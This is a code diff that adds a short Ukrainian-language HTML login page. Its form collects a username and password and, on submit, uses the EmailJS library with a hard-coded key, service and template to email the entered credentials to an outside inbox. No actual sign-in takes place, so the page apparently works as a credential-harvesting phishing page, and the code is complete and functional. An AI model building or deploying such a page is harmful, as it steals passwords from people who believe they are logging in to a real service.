@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Форма входу</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body>
+    <form id="login-form">
+        <label for="username">Логін:</label>
+        <input type="text" id="username" name="username" class="_2GBWeup5cttgbTw8FM3tfx" required>
+        <br>
+        <label for="password">Пароль:</label>
+        <input type="password" id="password" name="password" class="_2GBWeup5cttgbTw8FM3tfx" required>
+        <br>
+        <button type="submit">Надіслати</button>
+    </form>
+
+    <script>
+        (function() {
+            emailjs.init("zWmnU1DO8j_55UF-e"); // Ваш Public Key
+        })();
+
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            emailjs.sendForm('service_djr1rzw', 'template_8ttt0ai', this)
+                .then(function(response) {
+                    console.log('Email відправлено', response);
+                    alert('Форма надіслана!');
+                }, function(error) {
+                    console.log('Помилка при відправленні email', error);
+                    alert('Помилка при надсиланні форми.');
+                });
+        });
+    </script>
+</body>
+</html>
